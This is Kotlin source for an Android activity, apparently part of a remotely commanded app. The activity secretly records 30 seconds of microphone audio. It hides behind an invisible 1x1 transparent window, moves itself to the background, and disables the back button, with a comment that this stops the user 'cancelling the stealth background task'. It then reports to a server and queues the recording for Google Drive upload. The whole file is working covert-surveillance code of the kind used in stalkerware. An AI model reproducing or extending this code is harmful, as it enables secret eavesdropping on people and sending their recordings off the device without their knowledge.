package com.neubofy.veto.ui

import android.Manifest
import android.content.pm.PackageManager
import android.media.MediaRecorder
import android.os.Build
import android.os.Bundle
import android.view.WindowManager
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import com.neubofy.veto.transports.NextJsServerTransport
import com.neubofy.veto.utils.MediaStorageManager
import com.neubofy.veto.utils.MediaSyncManager
import com.neubofy.veto.utils.log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import java.io.File

class DummyAudioActivity : AppCompatActivity() {

    private val appScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private var hasStarted = false

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        val ctx = applicationContext
        if (ContextCompat.checkSelfPermission(ctx, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
            ctx.log().w(TAG, "Audio permission missing.")
            finish()
            return
        }

        window.attributes.alpha = 0f
        window.setDimAmount(0f)
        window.setGravity(android.view.Gravity.TOP or android.view.Gravity.START)
        window.setLayout(1, 1)
        window.setFlags(
            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
            WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS or
            WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
            WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS or
            WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL
        )
        @Suppress("DEPRECATION")
        overridePendingTransition(0, 0)

        moveTaskToBack(true)

        onBackPressedDispatcher.addCallback(this, object : androidx.activity.OnBackPressedCallback(true) {
            override fun handleOnBackPressed() {
                // Do nothing to prevent user from cancelling the stealth background task
            }
        })

        startRecording()
    }

    override fun onResume() {
        super.onResume()
        // Intentionally empty — recording is started in onCreate only
    }

    override fun onNewIntent(intent: android.content.Intent) {
        super.onNewIntent(intent)
        setIntent(intent)
        // Ignore re-delivery: a recording is already running
    }

    private fun startRecording() {
        if (hasStarted) return
        hasStarted = true

        val ctx = applicationContext
        val audioDir = MediaStorageManager.getAudioDir(ctx)
        val outputFile = File(audioDir, "audio_${System.currentTimeMillis()}.m4a")

        appScope.launch {
            com.neubofy.veto.utils.CommandQueueManager.runMediaCommandInQueue {
                val recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                    MediaRecorder(ctx)
                } else {
                    @Suppress("DEPRECATION")
                    MediaRecorder()
                }
                try {
                    recorder.setAudioSource(MediaRecorder.AudioSource.MIC)
                    recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                    recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                    recorder.setAudioEncodingBitRate(128000)
                    recorder.setAudioSamplingRate(44100)
                    recorder.setOutputFile(outputFile.absolutePath)
                    recorder.prepare()
                    recorder.start()

                    ctx.log().i(TAG, "Started recording audio in transparent activity...")
                    delay(30000L) // 30 seconds

                    recorder.stop()
                    recorder.release()

                    // Send Step 2 status message
                    val transport = NextJsServerTransport(ctx)
                    transport.send(
                        ctx,
                        "Audio captured successfully! Saved locally to ${outputFile.name}. Queued for Google Drive upload...",
                        "audio"
                    )

                    // Finish activity immediately
                    runOnUiThread { finish() }

                    // Trigger smart syncer for recent files (< 1 min)
                    MediaSyncManager.syncRecentMedia(ctx, maxAgeMillis = 60_000L, commandName = "audio")

                } catch (e: Exception) {
                    ctx.log().e(TAG, "Audio recording failed: ${e.message}")
                    val transport = NextJsServerTransport(ctx)
                    transport.send(ctx, "Audio recording failed: ${e.message}", "audio")
                    try { recorder.release() } catch (_: Exception) {}
                    runOnUiThread { finish() }
                }
            }
        }
    }

    companion object {
        val TAG = DummyAudioActivity::class.simpleName
    }
}
